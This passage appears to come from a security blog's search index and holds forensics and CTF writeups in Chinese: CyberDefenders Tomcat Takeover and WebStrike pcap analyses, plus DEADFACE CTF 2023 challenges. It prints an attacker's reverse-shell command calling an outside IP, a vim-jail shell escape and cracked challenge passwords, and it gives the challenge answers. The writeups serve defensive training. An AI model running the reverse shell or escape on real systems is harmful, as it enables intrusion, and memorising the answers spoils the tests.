746447f27820a9d863eea94d176cc135: (None) dc8b282b8f4e1dd3c5f95fd491ff6d8d: Jessica@1 b9cc9177094af2e17b413a0cbf63fac2: RedWine1! 944055b77ebe7d6fd80f24b5fce634fb: (dimension5150) fa6ecdc900cbeeb623cfc92297e5b653: (None) :::spoiler Flag Flag: !BETHEYBOO12! :::\n==Q17== # What was the original filename for Beth’s secrets?\nRecon # 直覺會用volatility看filescan的結果，不過沒有甚麼收穫，看了答案的hint才知道要去撈recycle bin的東西(誰知道啊)\nExploit # :::spoiler Flag Flag: SECRET_beth.txt :::\n==Q18== # What was the content of Beth’s secret file? ( six words, spaces in between)\nRecon # 直接呈上題，下一個檔案就是他的file content\n:::spoiler Flag Flag: Earth beth is the real beth :::\n==Q19== # The malware tried to obtain persistence in a similar way to how Carbanak malware obtains persistence. What is the corresponding MITRE technique ID?\nExploit # 直接看Carbanak的MITRE頁面，詳細的訊息可以看這邊\n:::spoiler Flag Flag: T1543.003 :::\nReference # CyberDefenders: Szechuan Sauce CTF Writeup\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":91,"href":"/security/practice/cyberdefender/network-forensic/cyberdefender---tomcat-takeover/","title":"CyberDefender - Tomcat Takeover","section":"Securities","content":" CyberDefender - Tomcat Takeover # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/135#nav-questions\n:::spoiler TOC [TOC] :::\nScenario # Our SOC team has detected suspicious activity on one of the web servers within the company\u0026rsquo;s intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further.\n==Q1== # Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?\nRecon # 直覺就是先看endpoint或conversation\nExploit # 可以看到==14.0.0.120==和內網的10.0.0.112，代表前者應該就是此次的外部攻擊者 :::spoiler Flag Flag: 14.0.0.120 :::\n==Q2== # Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker\u0026rsquo;s activities originated?\nRecon # 找到IP後丟到whois看detailed info\nExploit # 這一題問的是city，不是province，所以要填廣州，不是廣東 :::spoiler Flag Flag: Guangzhou :::\n==Q3== # From the pcap analysis, multiple open ports were detected as a result of the attacker\u0026rsquo;s activitie scan. Which of these ports provides access to the web server admin panel?\nRecon # 隨便猜\n:::spoiler Flag Flag: 8080 :::\n==Q4== # Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?\nRecon # 這一題直接問chat-gpt，因為工具太多了，乾脆直接問AI最快\nExploit # ChatGPT Answer\nDirb / Dirbuster / Gobuster / Dirsearch:\nThese tools are designed to brute-force directories and files on web servers by making requests with different wordlists. :::spoiler Flag Flag: Gobuster :::\n==Q5== # Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover?\nRecon # 這一題是從tcp flow中的transport file，慢慢回推回去tcp stream再詳細看其中的packet，因為根據題目敘述，它應該是狂送一大堆封包去爆目錄，所以我們只要往大方向觀察就知道大概在哪一段\nExploit # 根據extracted file的內容，在#20649附近的stream已經可以拿到reverse shell了，代表從這邊往前可能是個不錯的選擇 果不其然，它的順序一定是先爆路徑，之後再想怎麼塞reverse shell，所以從下圖可以知道有一大堆的404 error request，跟著他的stream就可以看到最重要的那個sub-path 又題目說到該頁面是個admin panel，代表應該是個可以登入做authentication的地方，所以後續看到的第一個status code 200的/example就不是我們的目標，而是再更後面的==/manager==，因為它有login stage :::spoiler Flag Flag: /manager :::\n==Q6== # Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization?\nRecon # 呈上題，拿到登入頁面當然就是要爆帳密，所以往後面的stream看可以發現有很多嘗試login的request，但都是401 Unauthorized\nExploit # 從下圖可以發現，往後刷幾個packets就有一個status 200的response，也就是attacker成功嘗試登入的response，從這邊把credential抓到base64 decode就會發現帳密 :::spoiler Flag Flag: admin:tomcat :::\n==Q7== # Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?\nRecon # 往後看tcp stream會發現manager有upload的功能，所以attacker嘗試上傳一些東西，應該是一個zip file\nExploit # :::spoiler Flag Flag: jxqozy.war :::\n==Q8== # Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?\nRecon # 再往後看同一個stream的其他packet，發現server response 200，上傳成功後就可以直接進入reverse shell，接著就是看它的指令，發現他想要常駐在該台電腦上\nExploit # :::spoiler Flag Flag: /bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/14.0.0.120/443 0\u0026gt;\u0026amp;1' :::\n"},{"id":92,"href":"/security/practice/cyberdefender/network-forensic/cyberdefender---webstrike/","title":"CyberDefender - WebStrike","section":"Securities","content":" CyberDefender - WebStrike # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/149\n:::spoiler TOC [TOC] :::\nScenario # An anomaly was discovered within our company\u0026rsquo;s intranet as our Development team found an unusual file on one of our web servers. Suspecting potential malicious activity, the network team has prepared a pcap file with critical network traffic for analysis for the security team, and you have been tasked with analyzing the pcap.\n==Q1== # Understanding the geographical origin of the attack aids in geo-blocking measures and threat intelligence analysis. What city did the attack originate from?\nRecon # 這一題直覺想法是利用whois的線上工具直接看註冊的ip，有甚麼樣的info，除了地點還有使用人的email之類的\nExploit # Detailed Info :::spoiler Flag Flag: Tianjin :::\n==Q2== # Knowing the attacker\u0026rsquo;s user-agent assists in creating robust filtering rules. What\u0026rsquo;s the attacker\u0026rsquo;s user agent?\nRecon # 直接看封包就有了\nExploit # 直接string search就好了，這一題很貼心，它是直接擷取開頭就是attacker和victim之間的conversation，沒有其他額外的protocol，所以比較好找 :::spoiler Flag Flag: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 :::\n==Q3== # We need to identify if there were potential vulnerabilities exploited. What\u0026rsquo;s the name of the malicious web shell uploaded?\nRecon # 直覺就是extract中間所有傳輸的檔案，再看他傳送檔案的packet內容寫的是甚麼\nExploit # 從下圖可以清楚的看到，他上傳檔案名稱是==image.jpg.php== :::spoiler Flag Flag: image.jpg.php :::\n==Q4== # Knowing the directory where files uploaded are stored is important for reinforcing defenses against unauthorized access. Which directory is used by the website to store the uploaded files?\nRecon # 可以翻看dump下來的那一些files，會發現它不只把傳送到victim的payload擷取下來，也擷取到victim回傳回來的結果\nExploit # 從payload和response可以知道存放upload files的path :::spoiler Flag Flag: /reviews/uploads/ :::\n==Q5== # Identifying the port utilized by the web shell helps improve firewall configurations for blocking unauthorized outbound traffic. What port was used by the malicious web shell?\nRecon # 我是直接follow tcp的flow，跟到它實際傳送payload的地方就知道Port Number是8080\nExploit # :::spoiler Flag Flag: 8080 :::\n==Q6== # Understanding the value of compromised data assists in prioritizing incident response actions. What file was the attacker trying to exfiltrate?\nRecon # 呈上上題\nExploit # :::spoiler Flag Flag: passwd :::\n"},{"id":93,"href":"/data-structure/data-structure/","title":"Data Structure","section":"Data Structures","content":" Data Structure # tags: Data Structure NYCU # Lecture 1 Lecture 2 Lecture 3 Lecture 4 Lecture 5 Lecture 6 Lecture 7 Lecture 8 Lecture 10 "},{"id":94,"href":"/security/competition/deadface-ctf-2023/","title":"DEADFACE CTF 2023","section":"Securities","content":" DEADFACE CTF 2023 # :::spoiler 比賽成果 :::\nSteganography # You\u0026rsquo;ve Been Ransomwared # Description # DEADFACE is taunting GlitterCo with their latest ransomware attack. According to our intel, the attackers like to leave a calling card in their attacks. If we can figure out which DEADFACE actor executed this attack, we might be able to figure out a way around paying. Can you find anything in this screenshot that might point to which attacker ran this ransomware attack?\nSubmit the flag as flag{attacker_name}.\nAttached File # Recon # 最簡單的水題，用Stegsolve就可以了\nExploit # Using Stegsolve and Extract the Image Convert to Char \u0026gt;\u0026gt;\u0026gt; a = [\u0026#39;01010100\u0026#39;, \u0026#39;01101000\u0026#39;, \u0026#39;01101001\u0026#39;, \u0026#39;01110011\u0026#39;, \u0026#39;00100000\u0026#39;, \u0026#39;01110010\u0026#39;, \u0026#39;01100001\u0026#39;, \u0026#39;01101110\u0026#39;, \u0026#39;01110011\u0026#39;, \u0026#39;01101111\u0026#39;, \u0026#39;01101101\u0026#39;, \u0026#39;01110111\u0026#39;, \u0026#39;01100001\u0026#39;, \u0026#39;01110010\u0026#39;, \u0026#39;01100101\u0026#39;, \u0026#39;00100000\u0026#39;, \u0026#39;01100010\u0026#39;, \u0026#39;01110010\u0026#39;, \u0026#39;01101111\u0026#39;, \u0026#39;01110101\u0026#39;, \u0026#39;01100111\u0026#39;, \u0026#39;01101000\u0026#39;, \u0026#39;01110100\u0026#39;, \u0026#39;00100000\u0026#39;, \u0026#39;01110100\u0026#39;, \u0026#39;01101111\u0026#39;, \u0026#39;00100000\u0026#39;, \u0026#39;01111001\u0026#39;, \u0026#39;01101111\u0026#39;, \u0026#39;01110101\u0026#39;, \u0026#39;00100000\u0026#39;, \u0026#39;01100010\u0026#39;, \u0026#39;01111001\u0026#39;, \u0026#39;00100000\u0026#39;, \u0026#39;01101101\u0026#39;, \u0026#39;01101001\u0026#39;, \u0026#39;01110010\u0026#39;, \u0026#39;01110110\u0026#39;, \u0026#39;01100101\u0026#39;, \u0026#39;01100001\u0026#39;, \u0026#39;01101100\u0026#39;, \u0026#39;00101110\u0026#39;] \u0026gt;\u0026gt;\u0026gt; for byte in a: ... print(bytes.fromhex(hex(int(byte, 2))[2:]).decode(\u0026#39;utf-8\u0026#39;), end=\u0026#34;\u0026#34;) ... This ransThis ransomware brought to you by mirveal. Flag: flag{mirveal}\nFetching Secrets # Description # This image was found on Ghost Town. Looks like one of DEADFACE’s newest members is new to steganography. See if you can find any hidden information in this image. Knowing information about the image may help to reveal the flag.\nSubmit the flag as: flag{flag_text}.\nRecon # 又學到一個新工具了-stegseek，然後這一題是參考 Steganography Pro TOOL : \u0026ldquo;Fetching Secrets\u0026rdquo; Walkthrough :ctf.deadface.io CTF 這一部影片，雖然我聽不懂看操作還是可以有樣學樣，主要就是利用這個工具爆破出steghide的密碼(真香.jpg)\nExploit - stegseek # $ stegseek ./Fetching\\ Secrets.jpeg rockyou.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek [i] Found passphrase: \u0026#34;kira\u0026#34;B) [i] Extracting to \u0026#34;Fetching Secrets.jpeg.out\u0026#34;. Flag: flag{g00d_dawg_woofw00f}\nElectric Steel # Description # Check out this image DEADFACE left on one of their victims\u0026rsquo; machines. We tried a couple tools and they didn’t reveal anything. Take a look and see what you can find.\nSubmit the flag as flag{flag_text}.\nRecon # 這一題學到新的東西，應該說小地方沒有注意到，按照基本的recon技巧都做了(包含binwalk/pngcheck/exiftool/strings/file/stat\u0026hellip;)，但都沒有甚麼發現，應該說其實會有不一樣的地方，這次是參考這一篇WP，然後發現到原來裡面有藏東西，可以用tar直接解壓縮拿到flag\n:::info binwalk -e代表extract； tar -x代表extract；-f代表解壓的file :::\nExploit # $ binwalk -e electric-steel.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1232 x 928, 8-bit/color RGB, non-interlaced 2767 0xACF Zlib compressed data, default compression 1435378 0x15E6F2 TIFF image data, big-endian, offset of first image directory: 8 1435914 0x15E90A Copyright string: \u0026#34;Copyright (c) 1998 Hewlett-Packard Company\u0026#34; 1467642 0x1664FA gzip compressed data, from Unix, last modified: 2023-06-04 01:14:27 $ cd _electric-steel.png-0.extracted $ tar -xf 1664FA $ ll total 1444 drwxrwxrwx 1 sbk6401 sbk6401 4096 Oct 28 16:03 . drwxrwxrwx 1 sbk6401 sbk6401 4096 Oct 28 16:02 .. -rwxrwxrwx 1 sbk6401 sbk6401 10240 Oct 28 16:02 1664FA -rwxrwxrwx 1 sbk6401 sbk6401 0 Oct 28 16:02 ACF -rwxrwxrwx 1 sbk6401 sbk6401 1465049 Oct 28 16:02 ACF.zlib -rwxrwxrwx 1 sbk6401 sbk6401 30 Jun 4 09:14 flag.txt $ cat flag.txt flag{3L3ctr1c_5t33L_b1G_H41R} Flag: flag{3L3ctr1c_5t33L_b1G_H41R}\nForensics # What\u0026rsquo;s the Wallet # Description # Ransomware was recently discovered on a system within De Monne’s network courtesy of a DEADFACE member. Luckily, they were able to restore from backups. You have been tasked with finding the Bitcoin wallet address from the provided sample so that it can be reported to the authorities. Locate the wallet address in the code sample and submit the flag as flag{wallet_address}.\nSource code # :::spoiler Source Code\n# Get the current date and time $currentTime = Get-Date # Format the current date and time $formattedTime = $currentTime.ToString(\u0026#34;dddd, MMMM d, yyyy - HH:mm:ss\u0026#34;) # Get the current time in different time zones $utcTime = Get-Date -Format \u0026#34;HH:mm:ss\u0026#34; -Utc $nyTime = (Get-Date).ToUniversalTime().AddHours(-4).ToString(\u0026#34;HH:mm:ss\u0026#34;) $tokyoTime = (Get-Date).ToUniversalTime().AddHours(9).ToString(\u0026#34;HH:mm:ss\u0026#34;) # Display the current date and time Write-Host \u0026#34;Current Date and Time: $formattedTime\u0026#34; Write-Host \u0026#34;-----------------------------------------\u0026#34; # Display the current time in different time zones Write-Host \u0026#34;Current Time (UTC): $utcTime\u0026#34; Write-Host \u0026#34;Current Time (New York): $nyTime\u0026#34; Write-Host \u0026#34;Current Time (Tokyo): $tokyoTime\u0026#34; $encrypt = \u0026#34;djkulwiflwingsaili2ik7h5l2bn\u0026#34; $encodedString = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($encrypt)) Write-Host \u0026#34;Encoded String: $encodedString\u0026#34; # Check if the system supports virtualization $virtualizationEnabled = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty VirtualizationFirmwareEnabled if ($virtualizationEnabled -eq $true) { Write-Host \u0026#34;Virtualization is enabled on this system.\u0026#34; } else { Write-Host \u0026#34;Virtualization is not enabled on this system.\u0026#34; } # Check if Hyper-V is installed and enabled $hyperVEnabled = Get-WindowsOptionalFeature -FeatureName Microsoft-Hyper-V-All -Online | Where-Object { $_.State -eq \u0026#34;Enabled\u0026#34; } if ($hyperVEnabled) { Write-Host \u0026#34;Hyper-V is installed and enabled on this system.\u0026#34; } else { Write-Host \u0026#34;Hyper-V is not installed or enabled on this system.\u0026#34; } $encodedScript = @\u0026#34; function Store-BtcWalletAddress { `$global:BtcWalletAddress = [System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetBytes(\u0026#39;bjMzaGE1bm96aXhlNnJyZzcxa2d3eWlubWt1c3gy\u0026#39;)) } # Call the function to store the encoded Bitcoin wallet address Store-BtcWalletAddress # Access the stored encoded Bitcoin wallet address Write-Host \u0026#34;Encoded Bitcoin Wallet Address: `$BtcWalletAddress\u0026#34; \u0026#34;@ $encodedScriptBytes = [System.Text.Encoding]::Unicode.GetBytes($encodedScript) $encodedScriptBase64 = [System.Convert]::ToBase64String($encodedScriptBytes) Write-Host \u0026#34;Encoded Script:\u0026#34; Write-Host $encodedScriptBase64 $address = \u0026#34;127.0.0.1\u0026#34; # Set ping parameters $pingCount = 4 $timeout = 1000 # Timeout value in milliseconds # Perform the ping $pingResult = Test-Connection -ComputerName $address -Count $pingCount -TimeoutMilliseconds $timeout if ($pingResult) { Write-Host \u0026#34;Ping to $address was successful.\u0026#34; Write-Host \u0026#34;Ping statistics for $address :\u0026#34; Write-Host \u0026#34;------------------------------------\u0026#34; Write-Host \u0026#34;Packets: Sent = $($pingResult.Count), Received = $($pingResult.ReceivedCount), Lost = $($pingResult.Loss)\u0026#34; Write-Host \u0026#34;Approximate round trip times in milliseconds:\u0026#34; $pingResult | ForEach-Object { Write-Host \u0026#34; Response from $($_.Address): time=$($_.ResponseTime)ms TTL=$($_.TimeToLive)\u0026#34; } } else { Write-Host \u0026#34;Ping to $address failed.\u0026#34; } $apiUrl = \u0026#34;https://api.coingecko.com/api/v3/simple/price?ids=bitcoin\u0026amp;vs_currencies=usd\u0026#34; $response = Invoke-RestMethod -Uri $apiUrl $bitcoinPrice = $response.bitcoin.usd Write-Host \u0026#34;Current Bitcoin Price (USD): $bitcoinPrice\u0026#34; $word = \u0026#34;Your data\u0026#34; $encryptionKey = \u0026#34;MyEncryptionKey123\u0026#34; $secureString = ConvertTo-SecureString -String $word -AsPlainText -Force $encryptedData = ConvertFrom-SecureString -SecureString $secureString -Key (1..16 | ForEach-Object { $encryptionKey[$_] }) $encryptedString = [System.Text.Encoding]::UTF8.GetString($encryptedData) Write-Host \u0026#34;Encrypted Word: $encryptedString\u0026#34; $message = \u0026#34;Y0ur D@tA has been 3ncrypted pay 100 BTC (Bitcoin) to Deadface\u0026#34; Write-Host $message ▐W ▓▌ ▓▓ ▐▓▓ ▓▓▌▓ ▐▒▌▓▀ ,, ▄▄▄▄▄▓▄▄▄L w═$▄T▀▓▒▀▓▀ßß▄╦▄ ▄▓████▄ ▄▄████▓▀▀▀▀████▓▌▌ T ╕ █▒▒█▒▒▒▒▓▒░▀██▀███▌ ▄████▀ ▓▓▀▀ , ▐▒▒▒▀▒▒▀▒▀▄▒░▀▓███▀ ¬▄▄▄▄▄▄▄⌐▓███▀▄▄▄▄▄▄▄▄▄ ▀r ╓▐ █▒▒▒▒▓▒▒▒▒▀▌▓████▓▄██ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄∞ ╚███▓▓▓]███M▀▓▓▓▓▓▓▓▓\\▀\u0026#39; ,╛ ▄ ▓▒▒▒▀▓▒▒▒▄▄████▓▓███,▀▓▓▓▓▓▓▓▓▓▓▓▓▓███▀ ███░┤▐███▐▓▓▓▓▓▓▓▓ ▌Γ ▐▌░▒▒▒▓████▀▒░██▓▓▄▄▄▄▄▄▄╚▓▓▓▓▌░▓██╩ ▓██▄▐███\u0026#34;████▀▀▄▄█▄▄ ▐▒▌▄▒▒▒▀▓▓▀▒▒▒▒▐▀▄██▓▓████▓▀█▀░███ ▀██w███▌▀▀▄T⌠▓▓▓█▓╚█ j▌▒▒▌▄▄▄▄▄▄▄▄▄▄▓░▀█▐███▄▐███]▄██▓ ╙██\u0026#34;█████▓█▓█▓▓▓█ ▓ ,████████████████████▓▄▄██▓▐██▀ ██▄▀█████▓█▓▓▓█ █ ▄▄▄, ███▓█▓█▓▓▓▓▓▓████▓█▓█▓████▌▄██\u0026#39; ╓╖ ▀██▐▄⌠▀▓██▓▓▓█▐T ╔███████▄ ▀▌╒█▓██▓▓▓▓▓▓▓▀▓▓███▓█▓▀⌠,█▌▓█ ╘╖╓┘ ▀██▄┘▄███▓▓██ T╒███████▄█▓ W▐▓▓█▓▓▓▓▓▀▓▌▓▓▓███▓██▓▓▀▀▄▀ ª ]L ] \u0026#34;█▓▄██▀▄▀███▄▄▐███████▓▐\u0026#39; ▓███▓▓▓▌▌▓▓▓▓▓▓██▀▓▀╔H▓██▀ ] ] . ▌▓██▌▄▄▄███▌ ▀██████▌▓\u0026#39; ▄▓▀█▓███▓█████▓██╔▄JM░███\u0026#39; ] ] % -▀▓██████▓═ ⌠▀⌡⌠ ▄\u0026#34; ▐█▀w ▀█▀▀▀▀▀▀▀▀ ╘▓▄▓▒▒███ ║^ ] ╔*τ ╙, ▐█▌╔███▓I ,▄▀ ¬███▀ \u0026#34;▀▄, I█┌▄██▀ ╨ ` ,,╔ ╙≈ª ║ \u0026#34; ███████▄▄, \u0026#39; ▀█▌█▌\u0026#34; ,▄▄∞▀;▓██▀ ╝ ╘,,╛ .╨ ▀▀██▓▀▄⌐█▓██▄.╕ \u0026gt; ¿ ,═▄▌█▓▓▐▀░███, ╗ . ┌┐ 0` ╗` ▀██▌░█▌▓▀▀███╔▌╕▄w▄══▄▄▄W£▄██▐╘▀▌[▄██▓ %, `╙, ║╡ ╣ 0 ╙^ ╚██▓░P█▀ ████▓▓╒\u0026#39;▌▐ ▌▐╔▄▌██▄▀I▄▌▐██▀ ╓╕ , ` ╡ B╡ ╙╫╖ ═` 0 ║ ╞ ███ ▓▄ ⌠▀█▐jJ▀█▀▀█▐▐j▄█▀`\u0026#39;▄▄█▐█\u0026#34; - ╡ ╖ ┌ƒ .╣╛ ╓╖╙╢╗ ║ ║ ª ╚ ▀█▄▀▄⌐ \u0026#39;╙▀▓▄▀⌡⌠ ∞▄▀▄ ╝ ƒ ╡ ╡ ╓╢╜, ╙╖└▒ ƒ M , ╙╖ ╙┐ ▀██▄▀▄▄, ⌠`\u0026#39;Mⁿ ⌠\u0026#39; ▄Æ▀▄▀ ╜ ╓╜ \u0026#34; ╙╖╙╖ ╢╜ ƒ` ║ ▒ ╥╢╥@ . . L ╙ ╙███▒≡▀═▄ \u0026#39; ▄M⌠▄██▀ ╜ ] \u0026#39; \u0026#39; ║ ║ ▒ ╡ :::\nRecon # 這題雖然歸類為forensics但應該是reverseㄅ，有夠水，他只是要知道電子錢包的地址是啥，所以看一下source code就知道了\nExploit # \u0026gt;\u0026gt;\u0026gt; from base64 import * \u0026gt;\u0026gt;\u0026gt; b64decode(b\u0026#39;bjMzaGE1bm96aXhlNnJyZzcxa2d3eWlubWt1c3gy\u0026#39;) b\u0026#39;n33ha5nozixe6rrg71kgwyinmkusx2\u0026#39; Flag: flag{n33ha5nozixe6rrg71kgwyinmkusx2}\nHost Busters 1 # Description # Turbo Tactical has gained access to a DEADFACE machine that belongs to gh0st404. This machine was used to scan one of TGRI’s websites. See if you can find anything useful in the vim user’s directory.\nOn a side note, it’s also a good idea to collect anything you think might be useful in the future for going after DEADFACE.\nSubmit the flag as flag{flag_here}.\nvim@gh0st404.deadface.io\nPassword: letmevim\nRecon # 這一題就比較有趣了，不過也是水題，就是個VimJail，可以看一下VimJail\n$ ssh vim@gh0st404.deadface.io vim@gh0st404.deadface.io\u0026#39;s password: :set shell=/bin/bash :shell vim@e5db30e81586:~$ ls -al total 24 drwxrwxr-x 1 vim vim 4096 Jul 29 23:05 . drwxrwxr-x 1 root root 4096 Jul 29 23:05 .. -rw-r--r-- 1 vim vim 220 Apr 23 21:23 .bash_logout -rw-r--r-- 1 vim vim 3526 Apr 23 21:23 .bashrc -rw-r--r-- 1 vim vim 807 Apr 23 21:23 .profile -rw-rw-r-- 1 vim vim 26 Jul 29 23:05 hostbusters1.txt vim@e5db30e81586:~$ cat hostbusters1.txt flag{esc4P3_fr0m_th3_V1M} Flag: flag{esc4P3_fr0m_th3_V1M}\nMalum # Description # Well, it happened. The ransomware event took us out but we are recovering. It\u0026rsquo;s Tuesday now and time to head into the office. As you arrive your boss walks into the SOC with a sigh and look right to you; here we go. He drops a USB on your desk and says \u0026ldquo;I need you to go through all the logs to find out HOW these guys got valid credentials to attack us\u0026rdquo;. Can you identify the threat vector that was used to gain persistence into the network by reading through security logs? What you find will be the flag.\nSubmit the flag as flag{flagText}\nRecon # 這一題有一點小通靈成分，剛好最近在玩windows forensics的東西所以直接用EvtxECmd.exe換成csv再用timeline explorer篩filter，如果單純用windows的event explorer，眼睛會脫窗\nExploit # $ EvtxECmd.exe -f Maybehere.evtx --csv output 首當其衝一定先看event ID 4625(logon failure)，就變成非常少的event，看一下裡面的payload，就會發現奇怪的字串，想說試看看結果就猜中了，解的莫名其妙QAQ Flag: flag{stabBingStabber1}\nTin Balloon # Description # We\u0026rsquo;ve discovered that DEADFACE was somehow able to extract a fair amount of data from Techno Global Research Industries. We are still working out the details, but we believe they crafted custom malware to gain access to one of TGRI\u0026rsquo;s systems. We intercepted a Word document that we believe mentions the name of the malware, in addition to an audio file that was part of the same conversation. We\u0026rsquo;re not sure what the link is between the two files, but I\u0026rsquo;m sure you can figure it out!\nSubmit the flag as: flag{executable_name}. Example: flag{malware.exe}.\nRecon # 這一題真的是氣死我了，被0和O搞到咪咪冒冒 看到音檔直覺就是audacity開頻譜，果然看到字串藏在裡面，感覺就是word file的password，到這邊大概也只過五分鐘，心想可以秒解，殊不知被搞心態 Word Password: Gr33dK1Lzz@11Wh0Per5u3 Word Content\nWe have the ID card of one the brand new employees Alejandro, We now know the location of Techno Global, we have a man on sight that has been tailing him. We believe we can get into the facility at 3 am. We don’t know how long we can have a foothold on the system but we are going to use Wh1t3_N01Z3.exe to sent out a reverse shell. Be prepared to listen for the signal.\nFlag: flag{Wh1t3_N01Z3.exe}\nHost Busters 2 # Description # Now that you’ve escaped out of vim, scope out and characterize the machine. See if there are any other flags you can find without having to escalate to another user.\nSubmit the flag as flag{flag_here}.\nvim@gh0st404.deadface.io\nPassword: letmevim\nRecon # 這一題是參考Host Busters 2 - WP這一篇，主要的思路是:\n查看目前正在執行的process 發現有一個其實是有關flag的udp process 用netstat去聽拿到flag Exploit # $ ps aux vim@1329c5769906:~$ ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND vim 1 0.0 0.0 2576 928 pts/0 Ss 08:44 0:00 /bin/sh /usr/bin/start vim 9 0.0 0.0 1036 744 pts/0 S 08:44 0:00 /usr/bin/srv vim 10 0.3 0.2 11692 9120 pts/0 Sl 08:44 0:12 /bin/vim /home/gh0st404/config vim 12 0.0 0.0 4188 3496 pts/0 S 08:45 0:00 /bin/bash root 21 0.0 0.0 15404 1324 ? Ss 08:45 0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 star vim 38 0.0 0.0 8088 3912 pts/0 R+ 09:35 0:00 ps aux 從結果可以看到/usr/bin/start這個script被執行，然後/usr/bin/srv這個script直覺應該是和運行該題目的server有關係，從文章中作者有提到/usr/bin/srv其實是被UPX packer包起來的東西，所以沒有任何有關flag的plaintext可以從裡面撈 vim@1329c5769906:~$ cat /usr/bin/start #!/bin/sh /usr/bin/srv \u0026amp; #/etc/init.d/ssh start /bin/vim /home/gh0st404/config exit 0 不過從/usr/bin/start中的內容來看，應該是執行/usr/bin/srv就開啟這個題目了，所以我們可以直接看他正在跑的網路狀況(netstat) vim@1329c5769906:~$ netstat -plano (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name Timer tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - off (0.00/0/0) tcp6 0 0 :::22 :::* LISTEN - off (0.00/0/0) udp 0 0 0.0.0.0:9023 0.0.0.0:* 9/srv off (0.00/0/0) Active UNIX domain sockets (servers and established) Proto RefCnt Flags Type State I-Node PID/Program name Path 從結果可以知道有一個localhost使用udp protocol的連線正在執行，所以我們可以直接用nc戳9023 port，直接用-u(udp mode)傳送資料過去 vim@1329c5769906:~$ nc -u 0.0.0.0 9023 flag{Hunt_4_UDP_s3rv3r} Flag: flag{Hunt_4_UDP_s3rv3r}\nTraffic Analysis # Sometimes IT Lets You Down # Description # Lytton Labs has been having a slew of weird activity in the network lately. This recent PCAP capture we know contains a user account who compromised our domain controller. Can you figure out what user account was compromised?\nSubmit the flag as: flag{username}.\nRecon # 因為最近在玩一些cyberdefender的traffic analysis，其實這一題也和之前寫的CyberDefender - PsExec Hunt蠻像的，我也沒有仔細研究這個traffic大致在幹嘛，所幸直接看ntlm的authenticated username去撈就知道了\nExploit # Filter: ntulssp.auth.username != \u0026quot;NULL\u0026quot; Flag: flag{mmeyers}\nUVB-76 (Hello, are you there?) # Description # Lytton Labs system administators are talking through network traffic, probably complaining about the Turbo Tactical assessment. I have looked and looked but I can’t figure it out. Can you find the secret message?\nExploit # 水題，直接strings search \u0026ldquo;flag\u0026quot;就找到了\nFlag: flag{is_this_thing_on?}\nProgramming # Dead Drop # Description # The Incident Response Team at Aurora Pharmaceuticals recently recovered this file from a user’s computer. The artifacts indicate it was accessed by what they believe to be multiple DEADFACE members. The program appears to have set up the user’s workstation as a dead drop for DEADFACE members to convert a secret numerical code into a password string for further target access. Our decoding attempts have been unsuccessful, but the script appears to contain a recovery code that may be a good starting point.\nSubmit the flag as flag{the password} exactly how print_password() returns it.\nSource Code # # Password recovery: # buA9kvZ=T_A}b[J8l:@ob_tviPZtb_\u0026lt;olOpxkvZ=T_=xju]olOpxkvZ=T_bxlu]olOpxkvZ=QIEE arr = [\u0026#39;empty\u0026#39;, \u0026#39;interest\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;valuable\u0026#39;, \u0026#39;influence\u0026#39;, \u0026#39;from\u0026#39;, \u0026#39;scolded\u0026#39;, \u0026#39;would\u0026#39;, \u0026#39;got\u0026#39;, \u0026#39;key\u0026#39;, \u0026#39;facility\u0026#39;, \u0026#39;run\u0026#39;, \u0026#39;great\u0026#39;, \u0026#39;tack\u0026#39;, \u0026#39;scent\u0026#39;, \u0026#39;close\u0026#39;, \u0026#39;are\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;plan\u0026#39;, \u0026#39;counter\u0026#39;, \u0026#39;earth\u0026#39;, \u0026#39;self\u0026#39;, \u0026#39;we\u0026#39;, \u0026#39;sick\u0026#39;, \u0026#39;return\u0026#39;, \u0026#39;admit\u0026#39;, \u0026#39;bear\u0026#39;, \u0026#39;cache\u0026#39;, \u0026#39;to\u0026#39;, \u0026#39;grab\u0026#39;, \u0026#39;domination\u0026#39;, \u0026#39;feedback\u0026#39;, \u0026#39;especially\u0026#39;, \u0026#39;motivate\u0026#39;, \u0026#39;tool\u0026#39;, \u0026#39;world\u0026#39;, \u0026#39;phase\u0026#39;, \u0026#39;semblance\u0026#39;, \u0026#39;tone\u0026#39;, \u0026#39;is\u0026#39;, \u0026#39;will\u0026#39;, \u0026#39;the\u0026#39;, \u0026#39;can\u0026#39;, \u0026#39;global\u0026#39;, 